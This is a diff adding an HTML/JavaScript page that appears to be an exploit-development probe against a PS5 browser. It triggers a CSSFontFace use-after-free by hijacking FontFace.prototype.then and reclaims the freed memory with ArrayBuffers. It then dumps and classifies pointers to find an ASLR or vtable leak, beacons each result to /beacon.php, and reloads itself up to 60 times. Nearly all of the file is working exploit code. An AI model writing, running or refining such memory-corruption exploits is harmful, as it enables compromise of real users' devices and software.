@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>P811</title>
+<style>
+body{background:#0d1117;color:#c9d1d9;font:13px monospace;margin:8px;}
+pre{color:#7ee787;background:#161b22;border:1px solid #30363d;padding:8px;border-radius:4px;white-space:pre-wrap;word-break:break-all;}
+.hit{color:#f0883e;font-weight:bold;}
+.ptr{color:#ff7b72;}
+.code{color:#d2a8ff;font-weight:bold;}
+</style>
+</head><body>
+<pre id="o">P811 — q18 Timer vtable ASLR check (full 24-qword blueprint)</pre>
+<script>
+'use strict';
+var O=document.getElementById('o');
+function log(s){O.textContent+='\n'+s;}
+function bn(t,d){
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/beacon.php?tag=P811-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,900))+'&t='+Date.now(),false);
+    x.send();
+  }catch(e){}
+}
+
+/* Attempt counter via localStorage */
+var KEY='p811_attempt';
+var attempt=0;
+try{attempt=parseInt(localStorage.getItem(KEY))||0;}catch(e){}
+try{localStorage.setItem(KEY,String(attempt+1));}catch(e){}
+
+bn('BOOT','v3|attempt='+attempt);
+log('Attempt #'+attempt);
+
+/* BigUint64Array hex helper */
+function h16(big){return('0000000000000000'+big.toString(16)).slice(-16);}
+
+/* Classify a 64-bit value */
+function classify(hex){
+  var hi=parseInt(hex.slice(0,8),16)||0;
+  var lo=parseInt(hex.slice(8,16),16)||0;
+  if(hi===0&&lo===0) return 'ZERO';
+  if(hi===0&&lo<0x10000) return 'SMALL('+lo+')';
+  if(hi>=0xFFFF8000) return 'KERN_VA';
+  if(hi===0xFFFFFFFF) return 'SENTINEL';
+  /* Heap pointers on PS5: typically 0x10_XXXXXXXX range */
+  if(hi>=0x10&&hi<=0x1F) return 'HEAP_PTR';
+  /* Code/vtable: typically in lower ranges 0x00_5XXXXXXX or similar */
+  if(hi===0&&lo>=0x400000&&lo<=0xFFFFFFFF) return 'CODE_OR_DATA';
+  /* Module range: 0x5XX_XXXXXXXX or 0x8XX_XXXXXXXX */
+  if(hi>=0x100&&hi<=0xFFF) return 'MODULE_PTR';
+  return 'OTHER';
+}
+
+/* ========== CSSFontFace UAF (proven P791 pattern) ========== */
+
+var st=document.createElement('style');
+st.textContent="@font-face{font-family:bb1;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(st);
+var face=new FontFace('f1',"local('Helvetica')",{unicodeRange:'U+0041'});
+document.fonts.add(face);
+void face.loaded;
+
+var abs=[],fired=false;
+Object.defineProperty(FontFace.prototype,'then',{
+  configurable:true,
+  get:function(){
+    if(fired)return undefined;
+    fired=true;
+    if(st){st.remove();st.textContent='';st=null;}
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    abs=[];
+    for(var i=0;i<64;i++)abs.push(new ArrayBuffer(192));
+    try{document.fonts.check('1em bb1');}catch(e){}
+    document.body.offsetHeight;
+    return undefined;
+  },set:function(){}
+});
+document.fonts.load('1em f1, bb1','AB');
+
+setTimeout(function(){
+  delete FontFace.prototype.then;
+
+  /* Find best reclaimed AB */
+  var bestI=-1,bestNz=0;
+  for(var i=0;i<abs.length;i++){
+    var u=new Uint8Array(abs[i]),nz=0;
+    for(var j=0;j<u.length;j++)if(u[j]!==0)nz++;
+    if(nz>bestNz){bestNz=nz;bestI=i;}
+  }
+
+  if(bestI<0||bestNz<4){
+    bn('MISS','nz='+bestNz+'|att='+attempt);
+    log('MISS (nz='+bestNz+') — reloading...');
+    if(attempt<60){
+      setTimeout(function(){location.reload();},200);
+    }else{
+      bn('GIVEUP','60_attempts');
+      log('Gave up after 60 attempts.');
+    }
+    return;
+  }
+
+  /* ========== HIT — Full 24-qword dump ========== */
+  var ab=abs[bestI];
+  var bv=new DataView(ab);
+  var bu=new BigUint64Array(ab);
+
+  log('');
+  log('=== HIT at AB['+bestI+'] ('+bestNz+' nonzero bytes) attempt #'+attempt+' ===');
+  log('');
+
+  /* Build full dump */
+  var dumpLines=[];
+  var q18val='';
+  var ptrs=[];
+  var codeAddrs=[];
+
+  for(var q=0;q<24;q++){
+    var hex=h16(bu[q]);
+    var cls=classify(hex);
+    var offset='0x'+('00'+(q*8).toString(16)).slice(-3);
+    var line='q'+q+' ['+offset+'] = 0x'+hex+' ('+cls+')';
+    dumpLines.push(line);
+
+    if(q===18) q18val=hex;
+    if(cls==='HEAP_PTR'||cls==='MODULE_PTR') ptrs.push('q'+q+'=0x'+hex);
+    if(cls==='CODE_OR_DATA') codeAddrs.push('q'+q+'=0x'+hex);
+  }
+
+  /* Display full dump */
+  for(var d=0;d<dumpLines.length;d++) log(dumpLines[d]);
+
+  /* Beacon: send in chunks (URL length limit) */
+  var chunk1=[],chunk2=[],chunk3=[];
+  for(var q=0;q<8;q++) chunk1.push('q'+q+'='+h16(bu[q]));
+  for(var q=8;q<16;q++) chunk2.push('q'+q+'='+h16(bu[q]));
+  for(var q=16;q<24;q++) chunk3.push('q'+q+'='+h16(bu[q]));
+
+  bn('DUMP-A',chunk1.join('|'));
+  bn('DUMP-B',chunk2.join('|'));
+  bn('DUMP-C',chunk3.join('|'));
+
+  /* ========== q18 Analysis (Timer vtable at +0x90) ========== */
+  log('');
+  log('=== q18 (+0x90) Timer Vtable Analysis ===');
+  var q18cls=classify(q18val);
+  log('q18 = 0x'+q18val+' ('+q18cls+')');
+
+  if(q18val==='0000000000000000'){
+    log('RESULT: q18 is ZERO — Timer destructor nulled the vtable before reclaim.');
+    bn('Q18-ZERO','destructor_nulled');
+  }else if(q18cls==='CODE_OR_DATA'){
+    log('*** POTENTIAL ASLR LEAK! q18 is in code/data range! ***');
+    bn('Q18-CODE','0x'+q18val+'|POTENTIAL_ASLR_LEAK');
+  }else if(q18cls==='HEAP_PTR'){
+    log('q18 is a heap pointer (not a code vtable).');
+    bn('Q18-HEAP','0x'+q18val);
+  }else if(q18cls==='MODULE_PTR'){
+    log('*** POTENTIAL MODULE POINTER! Could be vtable! ***');
+    bn('Q18-MODULE','0x'+q18val+'|POTENTIAL_VTABLE');
+  }else{
+    log('q18 class: '+q18cls);
+    bn('Q18-OTHER','0x'+q18val+'|cls='+q18cls);
+  }
+
+  /* ========== self_addr from q11 ========== */
+  var q11hi=bv.getUint32(0x58+4,true);
+  var q11lo=bv.getUint32(0x58,true);
+  if(q11hi>0){
+    var borrow=(q11lo<0x68)?1:0;
+    var selfHi=q11hi-borrow;
+    var selfLo=(q11lo-0x68)>>>0;
+    log('');
+    log('self_addr = 0x'+selfHi.toString(16)+('00000000'+selfLo.toString(16)).slice(-8));
+    bn('SELF','0x'+selfHi.toString(16)+('00000000'+selfLo.toString(16)).slice(-8));
+  }
+
+  /* ========== Summary of ALL pointers found ========== */
+  log('');
+  log('=== Pointer Summary ===');
+  log('Heap pointers: '+(ptrs.length>0?ptrs.join(', '):'NONE'));
+  log('Code/data addrs: '+(codeAddrs.length>0?codeAddrs.join(', '):'NONE'));
+  bn('SUMMARY','heap='+ptrs.length+'|code='+codeAddrs.length+'|q18cls='+q18cls);
+
+  /* ========== Check ALL qwords for vtable-like patterns ========== */
+  log('');
+  log('=== Scanning all qwords for potential vtable/code pointers ===');
+  var vtableCandidates=[];
+  for(var q=0;q<24;q++){
+    var hex=h16(bu[q]);
+    var cls=classify(hex);
+    if(cls==='CODE_OR_DATA'||cls==='MODULE_PTR'){
+      vtableCandidates.push('q'+q+'=0x'+hex);
+    }
+  }
+  if(vtableCandidates.length>0){
+    log('CANDIDATES: '+vtableCandidates.join(', '));
+    bn('VTABLE-CANDIDATES',vtableCandidates.join('|'));
+  }else{
+    log('No code/vtable candidates found in any qword.');
+    bn('NO-VTABLE','all_heap_or_zero');
+  }
+
+  /* Reset attempt counter */
+  try{localStorage.setItem(KEY,'0');}catch(e){}
+
+  bn('DONE','complete|att='+attempt);
+  log('');
+  log('DONE');
+},400);
+</script></body></html>
